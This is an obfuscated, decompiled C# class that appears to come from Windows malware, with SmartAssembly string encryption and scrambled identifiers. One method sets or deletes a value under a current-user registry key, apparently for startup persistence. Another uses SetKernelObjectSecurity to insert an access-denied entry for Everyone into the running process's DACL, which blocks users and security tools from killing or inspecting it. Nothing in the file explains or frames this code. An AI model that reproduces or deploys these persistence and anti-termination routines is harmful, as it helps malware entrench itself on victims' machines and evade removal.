using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace MeMbmuKeumkr;

internal sealed class UfOIZUxlqTtgZwNdi
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr qWVrjyiWeLXLF, int JswjgBBgDqSZd, [Out] byte[] ouNMqBFkQdEH, uint DfWyryRfNLyKt, out uint qDmHCFltOyuVlkQZ);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr pOSZhDzUpIzbOAvr, int orOhLmGtwXQY, [In] byte[] bkVBYObklysGsR);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void QwMCBXJTkzY(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(getString_0(107369423));
			if (bool_0 && registryKey.GetValue(getString_0(107368866)) != null)
			{
				registryKey.DeleteValue(getString_0(107368866));
			}
			else
			{
				registryKey.SetValue(getString_0(107368866), getString_0(107395840));
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor zkOISZEPiREMJ(IntPtr intptr_0)
	{
		byte[] ouNMqBFkQdEH = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, ouNMqBFkQdEH, 0u, out var qDmHCFltOyuVlkQZ);
		if ((long)qDmHCFltOyuVlkQZ > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, ouNMqBFkQdEH = new byte[qDmHCFltOyuVlkQZ], qDmHCFltOyuVlkQZ, out qDmHCFltOyuVlkQZ))
		{
			return null;
		}
		return new RawSecurityDescriptor(ouNMqBFkQdEH, 0);
	}

	private void ezOaacEFWopI(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void YwOMxnyLRA()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = zkOISZEPiREMJ(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			ezOaacEFWopI(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static UfOIZUxlqTtgZwNdi()
	{
		Strings.CreateGetStringDelegate(typeof(UfOIZUxlqTtgZwNdi));
	}
}
